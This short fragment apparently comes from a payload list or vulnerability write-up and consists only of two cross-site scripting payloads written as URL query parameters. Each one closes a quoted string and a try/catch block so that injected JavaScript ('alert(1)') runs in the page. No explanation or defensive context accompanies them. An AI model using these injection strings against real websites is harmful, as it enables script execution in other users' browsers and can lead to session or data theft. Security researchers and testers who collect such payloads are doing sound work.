?arg01=id&arg02=xss\"))}catch(e){alert(1)}//%26width=123%26height=123

arg01=id&arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(1)
```



